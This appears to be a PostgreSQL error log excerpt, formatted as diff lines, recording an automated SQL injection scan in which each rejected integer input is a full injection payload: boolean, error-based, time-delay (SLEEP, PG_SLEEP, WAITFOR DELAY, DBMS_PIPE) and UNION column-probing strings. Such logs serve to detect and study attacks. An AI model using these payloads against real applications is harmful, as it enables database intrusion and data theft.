+|2016-10-06 19:25:12[ invalid input syntax for integer: "1%' AND 8688=8688 AND '%'='" at character 535
+|2016-10-06 19:25:12[ invalid input syntax for integer: "1 AND 4259=1089-- qiWx" at character 535
+|2016-10-06 19:25:12[ invalid input syntax for integer: "1 AND 8688=8688-- tjbg" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1) AND (SELECT 6979 FROM(SELECT COUNT(*),CONCAT(0x716b787871,(SELECT (ELT(6979=6979,1))),0x716b627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1205=1205" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1 AND (SELECT 6979 FROM(SELECT COUNT(*),CONCAT(0x716b787871,(SELECT (ELT(6979=6979,1))),0x716b627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1') AND (SELECT 6979 FROM(SELECT COUNT(*),CONCAT(0x716b787871,(SELECT (ELT(6979=6979,1))),0x716b627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('MnAX'='MnAX" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1' AND (SELECT 6979 FROM(SELECT COUNT(*),CONCAT(0x716b787871,(SELECT (ELT(6979=6979,1))),0x716b627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'WNub'='WNub" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1%' AND (SELECT 6979 FROM(SELECT COUNT(*),CONCAT(0x716b787871,(SELECT (ELT(6979=6979,1))),0x716b627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1 AND (SELECT 6979 FROM(SELECT COUNT(*),CONCAT(0x716b787871,(SELECT (ELT(6979=6979,1))),0x716b627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- bmjl" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1) AND 7225=CAST((CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (7225=7225) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC) AND (9369=9369" at character 535
+|2016-10-06 19:25:13[ invalid input syntax for integer: "1 AND 7225=CAST((CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (7225=7225) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC)" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1') AND 7225=CAST((CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (7225=7225) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC) AND ('xVKY'='xVKY" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1' AND 7225=CAST((CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (7225=7225) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC) AND 'crRz'='crRz" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1%' AND 7225=CAST((CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (7225=7225) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC) AND '%'='" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1 AND 7225=CAST((CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (7225=7225) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC)-- yNNr" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1) AND 1931=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1931=1931) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(113))) AND (6415=6415" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1 AND 1931=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1931=1931) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(113)))" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1') AND 1931=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1931=1931) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(113))) AND ('geNi'='geNi" at character 535
+|2016-10-06 19:25:14[ invalid input syntax for integer: "1' AND 1931=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1931=1931) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(113))) AND 'MOgz'='MOgz" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1%' AND 1931=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1931=1931) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(113))) AND '%'='" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1 AND 1931=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(120)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1931=1931) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(113)))-- uEbt" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1) AND 3737=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (3737=3737) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (3500=3500" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1 AND 3737=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (3737=3737) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1') AND 3737=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (3737=3737) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('UXcc'='UXcc" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1' AND 3737=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (3737=3737) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'xVrP'='xVrP" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1%' AND 3737=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (3737=3737) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='" at character 535
+|2016-10-06 19:25:15[ invalid input syntax for integer: "1 AND 3737=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(120)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (3737=3737) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- ZLIM" at character 535
+|2016-10-06 19:25:16[ invalid input syntax for integer: "1);(SELECT * FROM (SELECT(SLEEP(5)))aKPB)#" at character 535
+|2016-10-06 19:25:16[ invalid input syntax for integer: "1;(SELECT * FROM (SELECT(SLEEP(5)))aKPB)#" at character 535
+|2016-10-06 19:25:16[ invalid input syntax for integer: "1');(SELECT * FROM (SELECT(SLEEP(5)))aKPB)#" at character 535
+|2016-10-06 19:25:16[ invalid input syntax for integer: "1';(SELECT * FROM (SELECT(SLEEP(5)))aKPB)#" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1%';(SELECT * FROM (SELECT(SLEEP(5)))aKPB)#" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1);SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1;SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1');SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1';SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1%';SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1);WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:25:17[ invalid input syntax for integer: "1;WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1');WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1';WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1%';WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(86)||CHR(107)||CHR(70),5) FROM DUAL--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(86)||CHR(107)||CHR(70),5) FROM DUAL--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(86)||CHR(107)||CHR(70),5) FROM DUAL--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(86)||CHR(107)||CHR(70),5) FROM DUAL--" at character 535
+|2016-10-06 19:25:18[ invalid input syntax for integer: "1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(86)||CHR(107)||CHR(70),5) FROM DUAL--" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1) AND (SELECT * FROM (SELECT(SLEEP(5)))pZGI) AND (2669=2669" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))pZGI)" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1') AND (SELECT * FROM (SELECT(SLEEP(5)))pZGI) AND ('jDYv'='jDYv" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))pZGI) AND 'cWvY'='cWvY" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1%' AND (SELECT * FROM (SELECT(SLEEP(5)))pZGI) AND '%'='" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))pZGI)-- pPOZ" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1) AND 5280=(SELECT 5280 FROM PG_SLEEP(5)) AND (9113=9113" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1 AND 5280=(SELECT 5280 FROM PG_SLEEP(5))" at character 535
+|2016-10-06 19:25:19[ invalid input syntax for integer: "1') AND 5280=(SELECT 5280 FROM PG_SLEEP(5)) AND ('TyvK'='TyvK" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1' AND 5280=(SELECT 5280 FROM PG_SLEEP(5)) AND 'tFnl'='tFnl" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1%' AND 5280=(SELECT 5280 FROM PG_SLEEP(5)) AND '%'='" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1 AND 5280=(SELECT 5280 FROM PG_SLEEP(5))-- pXyD" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1) WAITFOR DELAY '0:0:5' AND (2810=2810" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1 WAITFOR DELAY '0:0:5'" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1') WAITFOR DELAY '0:0:5' AND ('Uvog'='Uvog" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1' WAITFOR DELAY '0:0:5' AND 'oSGG'='oSGG" at character 535
+|2016-10-06 19:25:20[ invalid input syntax for integer: "1%' WAITFOR DELAY '0:0:5' AND '%'='" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1 WAITFOR DELAY '0:0:5'-- UEil" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1) AND 8031=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(103)||CHR(69)||CHR(122),5) AND (2360=2360" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1 AND 8031=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(103)||CHR(69)||CHR(122),5)" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1') AND 8031=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(103)||CHR(69)||CHR(122),5) AND ('TiYI'='TiYI" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1' AND 8031=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(103)||CHR(69)||CHR(122),5) AND 'dMwR'='dMwR" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1%' AND 8031=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(103)||CHR(69)||CHR(122),5) AND '%'='" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1 AND 8031=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(103)||CHR(69)||CHR(122),5)-- ySVc" at character 535
+|2016-10-06 19:25:21[ invalid input syntax for integer: "1) ORDER BY 1-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:22[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1 ORDER BY 1-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1 UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:23[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,'qkxxq'||'VcecjAbILqkVUowAaMkLrhYoVeywLWrMFdlRyfvm'||'qkbpq',NULL-- -" at character 535
+|2016-10-06 19:25:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,'qkxxq'||'XbnCRrCxjfKzRkVTnYTokSFbLRcNDYcLasbxJHix'||'qkbpq',NULL,NULL-- -" at character 535
+|2016-10-06 19:25:25[ invalid input syntax for integer: "1 UNION ALL SELECT 'qkxxq'||'zuOZPfaLvypkOgpTVLknEPgiEWTwdYhMNDlsdOoI'||'qkbpq',NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,'qkxxq'||'MkLtqMVeHHFtPRhaDNUeFbpQmkQfJTmSIpSzpZbD'||'qkbpq'-- -" at character 535
+|2016-10-06 19:25:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,'qkxxq'||'oesXMcBHTZ'||'qkbpq',NULL-- -" at character 535
+|2016-10-06 19:25:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,'qkxxq'||'jRcrnvjbYM'||'qkbpq',NULL,NULL-- -" at character 535
+|2016-10-06 19:25:25[ invalid input syntax for integer: "1 UNION ALL SELECT 'qkxxq'||'cKlTaUjxum'||'qkbpq',NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,'qkxxq'||'zBRtpeFhHD'||'qkbpq'-- -" at character 535
+|2016-10-06 19:25:29[ invalid input syntax for integer: "1 UNION ALL SELECT 53,'qkxxq'||'JeCvUCsrkigbpDDScEErcWFbGXljSHOmXGawWcMT'||'qkbpq',53,53-- -" at character 535
+|2016-10-06 19:25:29[ invalid input syntax for integer: "1 UNION ALL SELECT 53,53,53,'qkxxq'||'muGykmAzTQCDDbvSmevQOVdeEuuJkXzVtfuUkZeo'||'qkbpq'-- -" at character 535
+|2016-10-06 19:25:29[ invalid input syntax for integer: "1 UNION ALL SELECT 'qkxxq'||'aJtssWLjCiBVfeyojvhlLhTKdJImNeykXUUGzYMp'||'qkbpq',53,53,53-- -" at character 535
+|2016-10-06 19:25:29[ invalid input syntax for integer: "1 UNION ALL SELECT 53,53,'qkxxq'||'PemxKCpsDkvQBARIqckuWdijvQSZcHktHzrALxVh'||'qkbpq',53-- -" at character 535
+|2016-10-06 19:25:29[ invalid input syntax for integer: "1 UNION ALL SELECT 53,'qkxxq'||'XeYTAScPMh'||'qkbpq',53,53-- -" at character 535
+|2016-10-06 19:25:29[ invalid input syntax for integer: "1 UNION ALL SELECT 53,53,53,'qkxxq'||'bMmYiiuakb'||'qkbpq'-- -" at character 535
+|2016-10-06 19:25:30[ invalid input syntax for integer: "1 UNION ALL SELECT 'qkxxq'||'dWhpRoXbpk'||'qkbpq',53,53,53-- -" at character 535
+|2016-10-06 19:25:30[ invalid input syntax for integer: "1 UNION ALL SELECT 53,53,'qkxxq'||'HsROLHzfYk'||'qkbpq',53-- -" at character 535
+|2016-10-06 19:25:31[ invalid input syntax for integer: "1') ORDER BY 1-- -" at character 535
+|2016-10-06 19:25:31[ invalid input syntax for integer: "1') UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:25:31[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:25:31[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:31[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:32[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:32[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:32[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:32[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:32[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' ORDER BY 1-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:33[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1%' ORDER BY 1-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:34[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1 ORDER BY 1-- -" at character 535
+|2016-10-06 19:25:35[ invalid input syntax for integer: "1 UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:36[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:25:37[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
